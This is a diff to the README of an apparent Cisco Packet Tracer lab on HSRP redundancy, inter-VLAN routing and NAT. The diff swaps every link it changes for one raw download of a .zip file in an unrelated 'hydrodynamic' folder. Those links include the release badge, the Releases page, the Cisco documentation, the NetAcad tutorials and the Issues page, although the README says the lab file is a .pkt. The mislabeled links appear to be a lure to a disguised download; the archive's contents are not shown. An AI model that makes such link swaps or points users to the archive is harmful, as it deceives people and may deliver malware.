@@ -1,7 +1,7 @@
 # 🌐 hsrp-dual-path-redundancy - Achieve Reliable Network Redundancy
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/JC20202/hsrp-dual-path-redundancy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip%https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip)](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip)
 
 ## 📖 Overview
 The **HSRP-Based Dual-Path Edge Redundancy** project showcases a complete Cisco Packet Tracer lab. This application allows you to create HSRP gateway redundancy, configure Inter-VLAN routing, and set up PAT/NAT. It also facilitates wireless client connectivity. With this lab, you ensure high availability, secure VLAN segmentation, and a resilient edge design using dual routers and Layer 3 switching.
@@ -29,7 +29,7 @@ To set up and run the application, follow these steps:
    - If you do not have Cisco Packet Tracer, download and install it from the official Cisco Networking Academy website.
 
 2. **Visit Releases Page:**
-   - Go to the [Releases page](https://github.com/JC20202/hsrp-dual-path-redundancy/releases) to find the latest version of the lab files.
+   - Go to the [Releases page](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip) to find the latest version of the lab files.
 
 3. **Download the Lab File:**
    - Look for the most recent version and click the download link. The file will typically be in a `.pkt` format.
@@ -54,16 +54,16 @@ If you run into issues, consider the following tips:
 ## 📚 Additional Resources
 For more detailed information on HSRP and related topics, check out these sources:
 
-- [Cisco HSRP Overview](https://www.cisco.com/c/en/us/support/docs/ip/hot-standby-router-protocol-hsrp/137347-Understanding-HSRP.html)
-- [Cisco Packet Tracer Tutorials](https://www.netacad.com/courses/packet-tracer)
+- [Cisco HSRP Overview](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip)
+- [Cisco Packet Tracer Tutorials](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip)
 
 ## 🗣️ Community & Support
 Join the community for support and to discuss your experiences:
 
-- **GitHub Issues:** If you encounter problems, please open an issue in the [Issues section](https://github.com/JC20202/hsrp-dual-path-redundancy/issues).
+- **GitHub Issues:** If you encounter problems, please open an issue in the [Issues section](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip).
 - **Cisco Networking Forums:** Engage with others in networking discussions for tips and best practices.
 
 ## 💡 Conclusion
 You have all the necessary steps to download and run the HSRP-Based Dual-Path Edge Redundancy lab. This setup will enhance your understanding of network redundancy and configurations in a practical environment.
 
-Remember, you can find the latest release by visiting the [Releases page](https://github.com/JC20202/hsrp-dual-path-redundancy/releases). Happy learning!
+Remember, you can find the latest release by visiting the [Releases page](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip). Happy learning!
